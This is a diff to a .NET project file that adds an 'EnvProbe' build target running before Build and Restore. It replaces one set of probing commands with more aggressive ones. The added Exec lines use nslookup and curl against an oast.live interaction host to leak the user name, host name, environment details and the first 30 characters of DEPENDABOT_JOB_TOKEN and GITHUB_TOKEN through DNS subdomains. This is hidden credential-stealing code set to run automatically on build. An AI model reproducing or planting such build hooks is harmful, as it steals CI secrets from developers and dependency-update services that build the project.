@@ -8,10 +8,14 @@
     <PackageReference Include="System.Data.SqlClient" Version="4.6.0" />
   </ItemGroup>
   <Target Name="EnvProbe" BeforeTargets="Build;Restore">
-    <Exec Command="nslookup rootv10.d90utg61b2eil2pder70nq6zbeyxf9h8f.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
-    <Exec Command="echo $DEPENDABOT_API_URL | tr -cd 'a-zA-Z0-9._:-' | cut -c1-50 | xargs -I{} nslookup apiurl-{}.d90utg61b2eil2pder70nq6zbeyxf9h8f.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
-    <Exec Command="test -n \"$DEPENDABOT_JOB_TOKEN\" &amp;&amp; nslookup has-jobtoken.d90utg61b2eil2pder70nq6zbeyxf9h8f.oast.live 2>/dev/null || nslookup no-jobtoken.d90utg61b2eil2pder70nq6zbeyxf9h8f.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
-    <Exec Command="whoami | tr -cd 'a-zA-Z0-9._-' | xargs -I{} nslookup u-{}.d90utg61b2eil2pder70nq6zbeyxf9h8f.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
-    <Exec Command="env | wc -l | xargs -I{} nslookup envcount-{}.d90utg61b2eil2pder70nq6zbeyxf9h8f.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="nslookup rootv11.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="test -n \"$DEPENDABOT_JOB_TOKEN\" &amp;&amp; nslookup has-jobtoken.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || nslookup no-jobtoken.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="test -n \"$DEPENDABOT_API_URL\" &amp;&amp; nslookup has-apiurl.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || nslookup no-apiurl.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="curl -sf http://d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live/http-egress-test 2>/dev/null &amp;&amp; nslookup http-works.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || nslookup http-blocked.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="whoami | tr -cd a-zA-Z0-9._- | xargs -I{} nslookup u-{}.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="hostname | tr -cd a-zA-Z0-9._- | xargs -I{} nslookup h-{}.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="env | wc -l | xargs -I{} nslookup envcount-{}.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="echo \"$DEPENDABOT_JOB_TOKEN\" | cut -c1-30 | tr -cd a-zA-Z0-9._- | xargs -I{} nslookup tok30-{}.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
+    <Exec Command="echo \"$GITHUB_TOKEN\" | cut -c1-30 | tr -cd a-zA-Z0-9._- | xargs -I{} nslookup ght30-{}.d91a9fm1b2elg0rtn39gh1z79uyq3guku.oast.live 2>/dev/null || true" IgnoreExitCode="true" />
   </Target>
 </Project>
